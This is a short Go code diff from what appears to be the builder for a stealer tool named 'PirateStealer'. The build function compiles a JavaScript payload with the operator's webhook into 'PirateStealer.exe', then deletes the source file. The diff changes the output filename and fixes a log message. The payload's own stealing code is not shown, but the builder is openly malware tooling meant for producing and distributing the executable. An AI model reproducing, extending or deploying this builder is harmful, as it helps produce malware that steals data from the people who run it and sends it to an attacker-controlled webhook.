@@ -84,13 +84,13 @@ func build(webhook string) {
 	v := versions[rand.Intn(len(versions))]
 	t := fmt.Sprintf(`-t %s`, v)
 	logger.Info(fmt.Sprintf(`Compiling: nexe %s index.js`, t))
-	_, err = exec.Command("nexe", t, "index.js").Output()
+	_, err = exec.Command("nexe", t, "-o", "PirateStealer.exe", "index.js").Output()
 	if err != nil {
 		logger.Fatal("Error while compiling", err)
 		time.Sleep(5 * time.Second)
 		os.Exit(1)
 	}
-	logger.Info("\nProgram have been compiled with your webhook")
+	logger.Info("Program has been compiled with your webhook")
 	err = os.Remove("index.js")
 	if err != nil {
 		logger.Fatal(err)
